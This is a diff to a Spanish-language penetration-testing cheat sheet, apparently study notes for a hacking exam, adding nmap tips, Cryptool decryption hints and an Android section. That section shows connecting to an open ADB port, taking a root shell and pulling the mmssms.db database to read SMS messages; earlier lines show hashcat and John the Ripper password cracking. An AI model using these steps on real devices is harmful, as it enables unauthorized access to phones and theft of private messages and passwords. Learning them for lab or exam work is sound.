@@ -3,6 +3,7 @@
 ## Scanning and Enumeration (Siempre *sudo su* antes de ejecutarlo)
 
 Escaneo para hosts activos dentro de una red, con **-A** se puede ver el hostname de la maquina: 
+-Pn es util cuando los hosts salen inactivos como "host seem be down"
 ```
 nmap -A [ip]
 nmap -Pn [ip]
@@ -91,7 +92,7 @@ Para identificar el BSSID primero se intenta con el comando de arriba, si no lo 
 ## Criptography
 Para **generar HASH de archivos** --> hashcalc (Windows)
 
-Para **desencriptar archivos** --> Cryptool (Windows, si no mencionan el Key length se presiona directamente decrypt, recuerda al buscar el archivo que este seleccionada en la ventana la opcion All Files (.*))
+Para **desencriptar archivos** --> Cryptool (Windows, si no mencionan el Key length se presiona directamente decrypt, recuerda al buscar el archivo que este seleccionada en la ventana la opcion All Files (.*)) Posibles algoritmos: RC4 Key Length 8 bits hexadecimales en 14 y DES(ECB)
 
 Para convertir a texto plano un hash, simplemente se copia el contenido del archivo y se pega en --> hashes.com o crackstation.net
 
@@ -106,4 +107,47 @@ hashcat -a 0 [archivo_hash_a_crackear] [wordlist_hashes, puede ser rockyou]
 **John The Ripper**
 ```
 john --wordlist=[ruta_wordlist_password] [archivo_hash_a_crackear]
+```
+## Hacking Android/Mobile
+```
+nmap -sV -p 5555 [ip red]
+sudo apt-get install android-tools-adb (por si no esta instalado)
+adb connect [ip]:5555
+adb root
+adb shell
+pwd
+ls
+```
+Recuerda que en adb se pueden usar los comandos cat, cd, ls, find.
+
+Para copiar una carpeta a la maquina:
+```
+exit (salir de la shell)
+adb pull [ruta completa de la carpeta que se quiere copiar]
+```
+Herramienta para determinar la entropia de un archivo:
+```
+apt-get install ent
+ent [nombre de archivo.extension]
+```
+Generador de hash Sha384
+```
+sha384sum [archivo]
+```
+Los mensajes de texto se encuentran por lo general en la base de datos **mmssms.db** (/data/data/com.android.providers/telephony/database/mmssms.db
+/data/data/com.android.providers.telephony/database/mmssms.db
+/data/user_de/0/com.android.providers.telephony/databases/mmssms.db) :
+```
+adb root
+adb shell
+find / -name "mmssms.db"
+exit
+adb pull [ruta completa del archivo]
+
+chmod +x mmssms.db
+sqlite3 mmssms.db
+.tables (muestra todas las tablas)
+SELECT * FROM sms;
+SELECT * FROM sms WHERE read=0;
+SELECT * FROM sms WHERE read=1;
 ```
